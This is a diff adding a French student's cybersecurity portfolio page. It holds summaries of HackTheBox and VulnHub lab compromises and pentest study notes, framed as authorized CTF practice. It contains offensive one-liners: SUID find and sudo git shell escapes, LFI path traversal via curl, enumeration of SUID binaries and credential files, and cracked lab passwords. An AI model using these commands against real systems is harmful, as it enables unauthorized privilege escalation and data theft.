+      <div class="tags"><span class="tag">SMB / rpcclient</span><span class="tag">LDAP</span><span class="tag">FTP / FTPS</span><span class="tag">Impacket</span><span class="tag">Evil-WinRM</span><span class="tag">Responder</span><span class="tag">enum4linux</span></div>
+    </div>
+    <div class="skill">
+      <h3><span class="si"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="m4 17 6-6-6-6M12 19h8"/></svg></span>Exploitation & post-exploitation</h3>
+      <p>Obtenir un accès, le stabiliser et l'élever jusqu'à root / administrateur.</p>
+      <div class="tags"><span class="tag">Buffer overflow x86</span><span class="tag">Shellcoding</span><span class="tag">Reverse / web shells</span><span class="tag">Upgrade TTY</span><span class="tag">sudo / SUID</span><span class="tag">GTFOBins</span><span class="tag">Metasploit</span></div>
+    </div>
+    <div class="skill">
+      <h3><span class="si"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M9 3H5a2 2 0 0 0-2 2v4m6-6h10a2 2 0 0 1 2 2v4M9 3v18m0 0H5a2 2 0 0 1-2-2v-4m6 6h10a2 2 0 0 0 2-2v-4"/></svg></span>Systèmes & outillage</h3>
+      <p>Opérer sous Linux, automatiser et transférer des données proprement.</p>
+      <div class="tags"><span class="tag">Linux / Kali / Exégol</span><span class="tag">Bash</span><span class="tag">Python</span><span class="tag">Git</span><span class="tag">netcat / OpenSSL</span><span class="tag">hydra / legba</span></div>
+    </div>
+    <div class="skill">
+      <h3><span class="si"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 4h12l4 4v12H4z"/><path d="M8 12h8M8 16h5M14 4v4h4"/></svg></span>Démarche & livrables</h3>
+      <p>Mener un test de façon structurée et restituer des résultats exploitables.</p>
+      <div class="tags"><span class="tag">Méthodologie en couches</span><span class="tag">Processus de pentest</span><span class="tag">Rédaction de write-ups</span><span class="tag">Scoring CVSS</span><span class="tag">Remédiation</span></div>
+    </div>
+  </div>
+</div></section>
+
+<section id="realisation"><div class="wrap">
+  <div class="sec-eyebrow"><span class="num">03</span> Réalisation phare</div>
+  <h2 class="sec-title">Exploitation d'un buffer overflow → root</h2>
+  <p class="sec-sub">Skills Assessment HackTheBox Academy — <em>Stack-Based Buffer Overflows on Linux x86</em>. D'un simple accès utilisateur à un shell root, avec write-up complet à l'appui.</p>
+  <article class="case">
+    <div class="case-top">
+      <div class="case-badges">
+        <span class="pill crit">● Criticité : Critique</span>
+        <span class="pill ok">✓ Résolu — uid=0</span>
+        <span class="pill">Boîte grise · Linux x86 32-bit</span>
+      </div>
+      <h3>NIXBOF32 — élévation de privilèges par dépassement de tampon</h3>
+      <p class="ctx">À partir d'un accès SSH utilisateur non privilégié, exploitation d'un binaire <strong>SUID root</strong> vulnérable (<code>strcpy()</code> non borné sur <code>argv[1]</code>) pour exécuter du code arbitraire et lire <code>/root/flag.txt</code>.</p>
+    </div>
+    <div class="case-grid">
+      <div class="cg"><div class="k">Vecteur</div><div class="v">Binaire SUID root</div></div>
+      <div class="cg"><div class="k">Offset retour</div><div class="v">2060 octets</div></div>
+      <div class="cg"><div class="k">Technique</div><div class="v">NOP sled + shellcode</div></div>
+      <div class="cg"><div class="k">Résultat</div><div class="v g">root + flag</div></div>
+    </div>
+    <div class="case-body">
+      <div class="case-cols">
+        <div>
+          <h4><svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 6h16M4 12h16M4 18h10"/></svg>Démarche</h4>
+          <ol class="steps">
+            <li>Énumération locale et inventaire des binaires SUID (<code>find / -perm -4000</code>).</li>
+            <li>Analyse statique du binaire&nbsp;: <code>file</code>, <code>readelf -l</code>, désassemblage <code>objdump</code>.</li>
+            <li>Analyse dynamique sous <code>gdb</code> pour localiser le tampon et confirmer l'offset.</li>
+            <li>Constat&nbsp;: protections mémoire toutes absentes (ASLR off, pile RWE, pas de canary).</li>
+            <li>Construction d'un payload <code>NOP sled + shellcode execve</code> null-free, puis bruteforce de l'adresse de retour sans octet nul.</li>
+            <li>Shell <code>root</code> obtenu, lecture du flag, rédaction du rapport.</li>
+          </ol>
+        </div>
+        <div>
+          <h4><svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M20 6 9 17l-5-5"/></svg>Compétences démontrées</h4>
+          <ul class="wins">
+            <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M20 6 9 17l-5-5"/></svg><span>Exploitation bas niveau&nbsp;: pile, registres, assembleur x86.</span></li>
+            <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M20 6 9 17l-5-5"/></svg><span>Shellcoding et contrainte des octets nuls via <code>argv</code>.</span></li>
+            <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M20 6 9 17l-5-5"/></svg><span>Lecture des protections mémoire (ASLR, NX, canary, PIE).</span></li>
+            <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M20 6 9 17l-5-5"/></svg><span>Rédaction d'un rapport&nbsp;: synthèse, finding, reproduction, impact, remédiation.</span></li>
+          </ul>
+        </div>
+      </div>
+      <div class="case-foot">
+        <span class="note">// Contexte autorisé — exercice HackTheBox Academy</span>
+        <button class="btn btn-ghost" id="wuToggle" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 4h12l4 4v12H4z"/><path d="M8 13h8M8 17h5"/></svg><span>Lire le write-up complet</span></button>
+      </div>
+      <div id="wuBody" hidden><div class="md" style="margin-top:22px;padding-top:22px;border-top:1px solid var(--border)"></div></div>
+    </div>
+  </article>
+</div></section>
+
+<section id="machines"><div class="wrap">
+  <div class="sec-eyebrow"><span class="num">04</span> Machines & write-ups</div>
+  <h2 class="sec-title">Des labs compromis de bout en bout</h2>
+  <p class="sec-sub">Machines d'entraînement VulnHub / CTF résolues dans mon lab isolé. Chaque fiche retrace la chaîne complète — reconnaissance, accès initial, élévation jusqu'à root. Clique pour dérouler.</p>
+
+  <details class="mach">
+    <summary><span class="mach-idx">01</span><span class="mach-main"><span class="mach-name">Mr Robot</span><span class="mach-sum">WordPress → brute-force → SUID nmap → root</span><span class="mach-chips"><span class="mchip">VulnHub</span><span class="mchip">Linux</span><span class="mchip">Difficulté moyenne</span><span class="mchip root">✓ root · 3 clés</span></span></span><span class="chev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="m9 6 6 6-6 6"/></svg></span></summary>
+    <div class="mach-body">
+      <div class="killchain">
+        <div class="phase"><h5><span class="ph">1</span>Reconnaissance</h5><ul><li><code>nmap</code> → ports 80/443, CMS WordPress.</li><li><code>gobuster</code> → <code>robots.txt</code> révèle <code>fsocity.dic</code> et la 1<sup>re</sup> clé.</li></ul></div>
+        <div class="phase"><h5><span class="ph">2</span>Accès initial</h5><ul><li>Déduplication de <code>fsocity.dic</code> en wordlist exploitable.</li><li><code>hydra</code> sur <code>/wp-login.php</code> → <code>elliot:ER28-0652</code>.</li><li>Éditeur de thème WP → page PHP piégée → reverse shell <code>www-data</code> (2<sup>e</sup> clé).</li></ul></div>
+        <div class="phase"><h5><span class="ph">3</span>Élévation</h5><ul><li>Utilisateur <code>robot</code> : hash MD5 cassé → mot de passe.</li><li><strong>SUID <code>nmap</code></strong> en mode interactif (<code>!sh</code>, GTFOBins) → root (3<sup>e</sup> clé).</li></ul></div>
+      </div>
+      <div class="mach-tags"><span class="tag">Gobuster</span><span class="tag">Hydra</span><span class="tag">WP theme RCE</span><span class="tag">Hash cracking</span><span class="tag">GTFOBins · SUID nmap</span></div>
+    </div>
+  </details>
+
+  <details class="mach">
+    <summary><span class="mach-idx">02</span><span class="mach-main"><span class="mach-name">DC-1</span><span class="mach-sum">Drupalgeddon → SUID find → root</span><span class="mach-chips"><span class="mchip">VulnHub</span><span class="mchip">Linux</span><span class="mchip">Facile</span><span class="mchip root">✓ root · 5 flags</span></span></span><span class="chev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="m9 6 6 6-6 6"/></svg></span></summary>
+    <div class="mach-body">
+      <div class="killchain">
+        <div class="phase"><h5><span class="ph">1</span>Reconnaissance</h5><ul><li><code>nmap</code> → Apache + <strong>Drupal 7</strong>.</li><li>Fingerprint du CMS et recherche d'exploit.</li></ul></div>
+        <div class="phase"><h5><span class="ph">2</span>Accès initial</h5><ul><li><strong>Drupalgeddon 2 (CVE-2018-7600)</strong> → shell <code>www-data</code>.</li><li><code>settings.php</code> → identifiants DB <code>dbuser:R0ck3t</code>.</li><li>Dump de la base → indice vers l'étape SUID.</li></ul></div>
+        <div class="phase"><h5><span class="ph">3</span>Élévation</h5><ul><li><strong>SUID <code>find</code></strong> → <code>find . -exec /bin/sh -p \;</code> (GTFOBins) → root.</li><li>Lecture de <code>thefinalflag.txt</code> ; hash <code>$6$</code> cassé.</li></ul></div>
+      </div>
+      <div class="mach-tags"><span class="tag">Drupalgeddon</span><span class="tag">CVE-2018-7600</span><span class="tag">settings.php</span><span class="tag">GTFOBins · SUID find</span></div>
+    </div>
+  </details>
+
+  <details class="mach">
+    <summary><span class="mach-idx">03</span><span class="mach-main"><span class="mach-name">DC-2</span><span class="mach-sum">cewl + wpscan → rbash → sudo git → root</span><span class="mach-chips"><span class="mchip">VulnHub</span><span class="mchip">Linux</span><span class="mchip">Facile / moyen</span><span class="mchip root">✓ root</span></span></span><span class="chev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="m9 6 6 6-6 6"/></svg></span></summary>
+    <div class="mach-body">
+      <div class="killchain">
+        <div class="phase"><h5><span class="ph">1</span>Reconnaissance</h5><ul><li><code>nmap</code> → WordPress (vhost <code>dc-2</code>), SSH sur le port <code>7744</code>.</li><li>Indice : les wordlists génériques ne suffisent pas → <strong>cewl</strong>.</li></ul></div>
+        <div class="phase"><h5><span class="ph">2</span>Accès initial</h5><ul><li><code>cewl</code> → wordlist sur-mesure ; <code>wpscan</code> énumère <code>admin / jerry / tom</code>.</li><li>Brute WP → <code>jerry:adipiscing</code>, <code>tom:parturient</code>.</li><li>SSH en <code>tom</code> → shell restreint <strong>rbash</strong> → évasion (<code>vi</code> / <code>BASH_CMDS</code>, <code>PATH</code>).</li></ul></div>
+        <div class="phase"><h5><span class="ph">3</span>Élévation</h5><ul><li><code>su jerry</code> → <code>sudo -l</code> autorise <code>git</code>.</li><li><strong>GTFOBins <code>sudo git</code></strong> (<code>!/bin/bash</code> dans le pager) → root.</li></ul></div>
+      </div>
+      <div class="mach-tags"><span class="tag">cewl</span><span class="tag">WPScan</span><span class="tag">Évasion rbash</span><span class="tag">GTFOBins · sudo git</span></div>
+    </div>
+  </details>
+
+  <details class="mach">
+    <summary><span class="mach-idx">04</span><span class="mach-main"><span class="mach-name">DC-3</span><span class="mach-sum">SQLi Joomla → PwnKit (CVE-2021-4034) → root</span><span class="mach-chips"><span class="mchip">VulnHub</span><span class="mchip">Linux</span><span class="mchip">Moyen</span><span class="mchip root">✓ root</span></span></span><span class="chev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="m9 6 6 6-6 6"/></svg></span></summary>
+    <div class="mach-body">
+      <div class="killchain">
+        <div class="phase"><h5><span class="ph">1</span>Reconnaissance</h5><ul><li><code>nmap</code> → CMS <strong>Joomla</strong>.</li><li>Identification de version et de vulnérabilités connues.</li></ul></div>
+        <div class="phase"><h5><span class="ph">2</span>Accès initial</h5><ul><li><strong>Injection SQL (CVE-2017-8917)</strong> → hash admin <code>bcrypt</code> extrait.</li><li>Cassage du hash → accès au panneau d'administration.</li><li>Template PHP piégé → reverse shell <code>www-data</code>.</li></ul></div>
+        <div class="phase"><h5><span class="ph">3</span>Élévation</h5><ul><li>Énumération (<code>linpeas</code>) : <code>pkexec</code> SUID, sudo 1.8.16.</li><li><strong>PwnKit CVE-2021-4034</strong> — compilation du PoC → root.</li></ul></div>
+      </div>
+      <div class="mach-tags"><span class="tag">Joomla SQLi</span><span class="tag">bcrypt cracking</span><span class="tag">Template RCE</span><span class="tag">PwnKit · CVE-2021-4034</span></div>
+    </div>
+  </details>
+
+  <details class="mach">
+    <summary><span class="mach-idx">05</span><span class="mach-main"><span class="mach-name">FristiLeaks 1.3</span><span class="mach-sum">Upload bypass → reverse shell → sudo → root</span><span class="mach-chips"><span class="mchip">VulnHub</span><span class="mchip">Linux</span><span class="mchip">Facile / moyen</span><span class="mchip root">✓ root</span></span></span><span class="chev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="m9 6 6 6-6 6"/></svg></span></summary>
+    <div class="mach-body">
+      <div class="killchain">
+        <div class="phase"><h5><span class="ph">1</span>Reconnaissance</h5><ul><li><code>nmap</code> → Apache ; découverte du répertoire <code>/fristi</code>.</li><li>Lecture du code source et des commentaires HTML.</li></ul></div>
+        <div class="phase"><h5><span class="ph">2</span>Accès initial</h5><ul><li>Identifiants cachés (commentaire + image <code>base64</code>) → portail admin.</li><li>Contournement du filtre d'upload → <code>shell.php</code> → reverse shell.</li></ul></div>
+        <div class="phase"><h5><span class="ph">3</span>Élévation</h5><ul><li>Pivot entre utilisateurs via scripts / <code>PATH</code> hijack.</li><li><code>sudo</code> mal configuré → root ; flag <code>Y0u_kn0w_y0u_l0ve_fr1st1</code>.</li></ul></div>
+      </div>
+      <div class="mach-tags"><span class="tag">Upload bypass</span><span class="tag">Reverse shell PHP</span><span class="tag">PATH hijack</span><span class="tag">sudo</span></div>
+    </div>
+  </details>
+
+  <details class="mach">
+    <summary><span class="mach-idx">06</span><span class="mach-main"><span class="mach-name">Metasploitable 2</span><span class="mach-sum">nmap --script vuln → 30 services, CVE multiples</span><span class="mach-chips"><span class="mchip">VulnHub</span><span class="mchip">Linux</span><span class="mchip">Analyse de vulnérabilités</span></span></span><span class="chev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="m9 6 6 6-6 6"/></svg></span></summary>
+    <div class="mach-body">
+      <div class="killchain">
+        <div class="phase"><h5><span class="ph">1</span>Scan complet</h5><ul><li><code>nmap -sV -p- --script vuln</code> → <strong>30 services</strong> ouverts.</li><li>Export XML + rapport HTML.</li></ul></div>
+        <div class="phase"><h5><span class="ph">2</span>Vulnérabilités</h5><ul><li><code>vsftpd 2.3.4</code> (backdoor), <code>distccd</code> <strong>CVE-2004-2687</strong>.</li><li><code>UnrealIRCd</code> (backdoor), Samba, Tomcat (8180), bindshell <code>1524</code>.</li><li>TLS faible : POODLE, CCS-injection, DH 512 bits.</li></ul></div>
+        <div class="phase"><h5><span class="ph">3</span>Priorisation</h5><ul><li>Tri des vecteurs par criticité et facilité d'exploitation.</li><li>Démarche de <em>vulnerability assessment</em> multi-services.</li></ul></div>
+      </div>
+      <div class="mach-tags"><span class="tag">Nmap NSE vuln</span><span class="tag">Cartographie de services</span><span class="tag">Analyse CVE</span><span class="tag">Priorisation</span></div>
+    </div>
+  </details>
+
+  <details class="mach">
+    <summary><span class="mach-idx">07</span><span class="mach-main"><span class="mach-name">NOOB</span><span class="mach-sum">Identifiants base64 → sudo (GTFOBins) → root</span><span class="mach-chips"><span class="mchip">VulnHub</span><span class="mchip">Linux</span><span class="mchip">Facile</span><span class="mchip root">✓ root</span></span></span><span class="chev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="m9 6 6 6-6 6"/></svg></span></summary>
+    <div class="mach-body">
+      <div class="killchain">
+        <div class="phase"><h5><span class="ph">1</span>Reconnaissance</h5><ul><li><code>nmap</code> → services exposés, dépôt de fichiers accessible.</li><li>Récupération d'identifiants encodés en <code>base64</code>.</li></ul></div>
+        <div class="phase"><h5><span class="ph">2</span>Accès initial</h5><ul><li>Décodage → <code>champ:password</code>.</li><li>Connexion avec le compte utilisateur.</li></ul></div>
+        <div class="phase"><h5><span class="ph">3</span>Élévation</h5><ul><li>Binaire <code>sudo</code> mal configuré → abus <strong>GTFOBins</strong> → root.</li></ul></div>
+      </div>
+      <div class="mach-tags"><span class="tag">Décodage base64</span><span class="tag">GTFOBins · sudo</span></div>
+    </div>
+  </details>
+
+  <p class="mach-note">// Également dans le lab : <strong>DC-4</strong> et un lab web Dockerisé <strong>ShopSecure</strong> (AJAX / <code>shopsecure.local</code>) — en cours.</p>
+</div></section>
+
+<section id="connaissances"><div class="wrap">
+  <div class="sec-eyebrow"><span class="num">05</span> Base de connaissances</div>
+  <h2 class="sec-title">Ma documentation technique</h2>
+  <p class="sec-sub">Les fiches que je construis au fil des machines. Elles montrent l'étendue de ce que je couvre et ma rigueur de documentation. Filtre par domaine ou recherche un outil&nbsp;; clique une fiche pour la déplier.</p>
+  <div class="kb-toolbar">
+    <div class="kb-search">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3" stroke-linecap="round"/></svg>
+      <input id="q" type="search" placeholder="Rechercher un outil, une technique…" autocomplete="off" spellcheck="false" aria-label="Rechercher dans les fiches">
+    </div>
+    <div class="filters" id="filters"></div>
+  </div>
+  <div class="kb-grid" id="kb"></div>
+  <div class="noresult" id="noresult">Aucune fiche ne correspond à ce filtre.</div>
+</div></section>
+
+<section id="contact"><div class="wrap">
+  <div class="contact-card">
+    <div class="sec-eyebrow" style="justify-content:center"><span class="num">06</span> Contact</div>
+    <h2>Discutons alternance</h2>
+    <p>Je suis à la recherche d'une alternance en cybersécurité. Pour échanger sur un poste, mon profil ou un projet, voici comment me joindre.</p>
+    <div class="contact-row">
+      <span class="clink copybtn" id="mailBtn" title="Copier l'adresse"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg>meunier.maxence16@gmail.com</span>
+      <a class="clink" href="https://www.linkedin.com/in/maxence-meunier-85ba21135" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 8a6 6 0 0 1 6 6v6h-4v-6a2 2 0 0 0-4 0v6h-4v-6a6 6 0 0 1 6-6Z"/><rect x="2" y="9" width="4" height="11"/><circle cx="4" cy="4" r="2"/></svg>LinkedIn</a>
+      <a class="clink" href="https://github.com/Maxence77" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.9a3.4 3.4 0 0 0-.9-2.6c3-.3 6.2-1.5 6.2-6.7A5.2 5.2 0 0 0 20 4.8 4.9 4.9 0 0 0 19.7 1S18.4.6 15.5 2.5a13 13 0 0 0-7 0C5.6.6 4.3 1 4.3 1A4.9 4.9 0 0 0 4 4.8a5.2 5.2 0 0 0-1.4 3.6c0 5.2 3.2 6.4 6.2 6.7a3.4 3.4 0 0 0-.9 2.6V22"/></svg>GitHub</a>
+      <a class="clink" href="https://profile.hackthebox.com/profile/019d66f4-79f2-73f9-a9d6-b27137344ca9" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 2 4 6v6c0 5 3.4 8 8 10 4.6-2 8-5 8-10V6l-8-4Z"/></svg>HackTheBox</a>
+    </div>
+  </div>
+</div></section>
+</main>
+
+<footer class="wrap">
+  <span>© 2026 Maxence Meunier — Portfolio cybersécurité</span>
+  <span>Tests & exercices en contexte autorisé (CTF · HTB · pédagogique)</span>
+</footer>
+
+<script type="text/plain" class="note-src" data-id="processus" data-title="Processus de test d&#x27;intrusion" data-cat="method" data-desc="Les phases d&#x27;un engagement, de la reconnaissance au rapport final." data-tags="Méthodologie,Phases,Rapport" data-cmds="0">
+phase de vulnérabilité :
+pendant cette phase on examine et analyse les infos recueillis pendant la phase de collecte d info
+
+Pour cette recherche on peut utiliser nc pour faire du banneregrabbing
+Certain site permette de connaitre des vuln de chaque composant comme: 
+NIST:https://nvd.nist.gov/vuln/search?execution=e2s1#/nvd/home?resultType=records
+
+CVEdetails:https://www.cvedetails.com/
+
+exploitdb:https://www.exploit-db.com/
+
+vulners:https://vulners.com/
+
+https://packetstorm.news/
+
+Phase d'exploitation:
+
+une fois qu'une ou deux vuln sont identifier il faut prioriser la probabilité de succés,le score CVSS ou la calculette NVD peut aider a faire ça
+puis la Complexité qui represente l'effort pour l exploité d une vuln spécifique,ce qui determine combien de temps,d'effort et de recherche nécessaire pour executer l'attaque pour le succés.
+Puis la probabilité de dommage causer par l'exécution d'un exploit  joue un role critique car il faut le plus possible limiter les dommages
+
+comme par exemple un tableau comme ça 
+<img loading="lazy" class="note-img" src="assets/img-20260605144442.png" style="max-width:100%%" alt="Schéma de note">
+pourrai etre tres utile.
+
+Dans le cas oû le POC es pas dispo il faudra le test dans une machine virtuel pour voir  ce qui faudrai modifier
+
+Post-exploitation:
+
+Cette phase vise a obtenir des informations sensibles et pertinentes pour la sécurité d'un point de vue local et des informations pertinentes pour les entreprises qui, dans la plupart des cas, nécessitent des privilèges plus élevés qu'un utilisateur standard. Cette étape comprend les éléments suivants:
+
+|                         |                                |
+| ----------------------- | ------------------------------ |
+| Tests évasifs           | Collecte d'informations        |
+| pillage                 | Évaluation de la vulnérabilité |
+| Escalade de privilège   | Persistance                    |
+| Exfiltration de données |                                |
+
+Tests évasifs:
+
+Dans un systeme bien monté tout changement et commande pourrai déclancher des alertes.Les tests évasifs et diviser en 3:
+Evasive,evasifs hybride,Non-evasive.
+
+collecte d'infos:
+Dans cette phases on collecte des infos depuis l interieur,ce qui offre une autre perspective
+
+Pillage:
+Dans cette étapes ont analyse la config réseau mais aussi :
+Interface,Routage,DNS,ARP,Services,VPN, Sous-réseaux, IP ,Les actions Trafic réseau
+
+Au cours de l'étape de pillage, nous rechercherons également des données sensibles telles que des mots de passe sur les partages, des machines locales, dans des scripts, des fichiers de configuration, des coffres-forts de mot de passe, des documents (Excel, Word, fichiers .txt, etc.) et même des e-mails.
+
+Persistance:
+
+Une fois qu'on une vue d ensemble du systeme/reseau la prochaine étape sera de garder un accés.
+
+Enumeration de la vulnérabilité:
+
+Il faut refaire l'etape de vulnérabilité de l'interieur qui permet de découvrir d'autre vuln
+
+il faut bien distinguer exploit qui peuvent nuire au système et les attaques sur les services qui ne cause aucune perturbation
+
+escalade de Privilège:
+
+dans cette phase que l'on fait une escalade horizontal (de user en user) pour trouver le user avc le plus de droit ou escalade vertical pour devenir root ou admin de la machine
+
+Exfiltration de données:
+
+Dans cette phase on tranfere toute les données trouver vers notre systeme tel que :
+
+|**Type d'information**|**Réglementation de sécurité**|
+|---|---|
+|Informations sur le compte de carte de crédit|`Payment Card Industry`(`PCI`)|
+|Information électronique sur la santé des patients|`Health Insurance Portability and Accountability Act`(`HIPAA`)|
+|Consommateurs Private Banking Information|`Gramm-Leach-Bliley`(`GLBA`)|
+|Information du gouvernement|`Federal Information Security Management Act of 2002`(`FISMA`)|
+
+Pivotement:
+
+c'es le fait d'utiliser un systeme intermediare pour acceder a un systeme innaccessible
+
+POC(preuve de concept)
+
+il sert de preuve qu'un projet est réalisable en principe
+
+le POC peut etre un document oû il y  a des vulns,le POC peut etre aussi un script ou un code pour exploiter automatiquement les vulns trouvé.
+
+Par contre l'inconvénhient c es qu'une fois les developpeur ou les admin ont le script il travaille pour contrer le script au lieu de comblet les breche que le script exploite
+
+Part exemple si un user a Password123 en MDP la vuln n es pas le MDP mais la politique de MDP (password policy) car si la politique ete bien faite le MDP ne pourrai pas etre utiliser
+
+Nettoyage:
+
+une fois tout les tests fait il es important de tout nettoyer,tel que suppr les logiciel/script download,supprimer les modif de config (mineur) faite ect...
+
+Il es import de faire un rapport et de documenter tout ce qu'on fait,chaque commande,chaque fichier trouvé,chaque vuln ect...
+Nous ne devrions pas conserver d’informations personnelles identifiables (PII), d’informations potentiellement incriminantes ou d’autres données sensibles que nous avons rencontrées tout au long des tests.
+
+- Une chaîne d'attaque (en cas de compromis interne complet ou d'accès externe à interne) détaillant les mesures prises pour parvenir à un compromis
+- Un solide résumé exécutif qu'un public non technique peut comprendre
+- Constatations détaillées spécifiques à l'environnement du client qui comprennent une cote de risque, un impact sur la constatation, des recommandations d'assainissement et des références externes de haute qualité liées à la question
+- Étapes adéquates pour reproduire chaque découverte afin que l'équipe responsable de la remédiation puisse comprendre et tester le problème tout en mettant en place des correctifs
+- Recommandations à court, moyen et long terme spécifiques à l'environnement
+- Annexes qui comprennent des informations telles que la portée cible, les données OSINT (si pertinentes à l'engagement), l'analyse de craquage de mot de passe (le cas échéant), les ports/services découverts, les hôtes compromis, les comptes compromis, les fichiers transférés aux systèmes appartenant au client, toute modification de création de compte/système, une analyse de sécurité Active Directory (le cas échéant), la numérisation pertinente des données/documents complémentaires, et toute autre information nécessaire pour expliquer une conclusion ou une recommandation spécifique
+
+Tests Post-Remédiation
+Cette phase consiste a examiner les docs donnée par le client qui montre les correctif apporté souvent inclus dans le prix
+
+On peut garder les preuvents un certain temps au cas oû il y a des questions.
+
+ Le champ d'action devrait clairement définir l'acceptation de tout projet livrable. Dans les évaluations des tests de pénétration, généralement, nous livrons un rapport marqué `DRAFT`et donner au client une chance d'examiner et de commenter. Une fois que le client a soumis des commentaires (c.-à-d. des réponses de la direction, des demandes de clarification/des changements, des preuves supplémentaires, etc.) soit par courriel ou (idéalement) lors d'une réunion d'examen du rapport, nous pouvons lui délivrer une nouvelle version du rapport marqué `FINAL`. Certains cabinets d’audit auxquels les clients peuvent être redevables n’accepteront pas un rapport de test de pénétration avec un `DRAFT`désignation. D’autres entreprises ne s’en soucieront pas, mais il est préférable de garder une approche uniforme pour tous les clients.
+</script>
+<script type="text/plain" class="note-src" data-id="enum-method" data-title="Méthodologie d&#x27;énumération" data-cat="method" data-desc="Le modèle en 6 couches, de la présence internet à la config du SE." data-tags="Énumération,6 couches" data-cmds="0">
+<img loading="lazy" class="note-img" src="assets/img-20260625190731.png" style="max-width:100%%" alt="Schéma de note">
+
+### Couche  N°1: Présence sur internet:
+`L'objectif de cette couche est d'identifier tous les systèmes et interfaces cibles possibles qui peuvent être testés.`
+
+### Couche N°2: Passerelle:
+`L'objectif est de comprendre à quoi nous avons affaire et à quoi nous devons faire attention`
+
+### Couche N°3 : Service accessible:
+`Cette couche vise à comprendre la raison et la fonctionnalité du système cible et à acquérir les connaissances nécessaires pour communiquer avec lui et l'exploiter efficacement à nos fins.
+### Couche N°4: Processus:
+`L'objectif ici est de comprendre ces facteurs et d'identifier les dépendances entre eux.`
+
+### Couche n°5 : Privilèges:
+`Il est crucial de les identifier et de comprendre ce qui est possible et ce qui ne l'est pas avec ces privilèges.`
+
+### Couche n°6 : Configuration du SE:
+`L'objectif ici est de voir comment les administrateurs gèrent les systèmes et quelles informations internes sensibles nous pouvons en tirer.`
+</script>
+<script type="text/plain" class="note-src" data-id="reflexes" data-title="Les bons réflexes" data-cat="method" data-desc="Le bon réflexe par situation : CMS, SUID, cron, LFI, Flask, rbash." data-tags="Quick wins,LFI,Cron,Flask" data-cmds="19">
+En CTF il faut regarder dans le settings.php surtout si on tombe sur un CMS 
+pour cela la commande serai:
+```bash
+find /var/www -name "settings.php" 2>/dev/null
+```
+
+si le flag ou des infos importante sont dans la DB:
+
+```bash
+# Récupérer les creds dans settings.php puis
+mysql -u USER -pPASSWORD -e "show databases;"
+mysql -u USER -pPASSWORD -e "select * from users;" <CMS>
+```
+
+whatweb sur tout les serveur web pour connaitre les eventuelles CVE
+
+utiliser linepeas.sh sur la cible a mettre dans /tmp 
+
+fichiers avec les perms interessant:
+
+```bash
+# SUID
+find / -perm -4000 2>/dev/null
+
+# SGID
+find / -perm -2000 2>/dev/null
+
+# World writable
+find / -perm -o+w 2>/dev/null
+
+# SUID + SGID ensemble
+find / -perm -4000 -o -perm -2000 2>/dev/null
+```
+
+fichiers sensibles lisibles:
+
+```bash
+find /etc -readable 2>/dev/null
+find / -name "*.conf" -readable 2>/dev/null
+find / -name "*.bak" 2>/dev/null
+find / -name "*.txt" 2>/dev/null
+```
+
+capabilities:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+cron jobs
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron*
+find / -name "*.cron" 2>/dev/null
+```
+
+sudo 
+
+```bash
+sudo -l
+```
+
+
+la commande ci dessous permet d'exploiter un SUID critique celui de find
+
+```bash
+find . -exec /bin/bash -p \; -quit
+```
+
+
+La commande pour se connecter a une DB mysql 
+
+```bash
+msql -u <user> -p <password> <nom db>
+```
+
+Quand l'URL a un paramètre tel que ?page=about.html c es très probablement un LFI (Local File Inclusion) donc la solution serai :
+
+```bash
+curl -s "<URL>?page=<../../../../<ce qu'on veut>"
+```
+
+on doit jouer avec les ../ selon où on veut remonter
+
+Pour se connecter en FTP la commande es:
+
+```bash
+ftp <ip du serveur>
+```
+
+par default c' es anonymous:anonymous
+
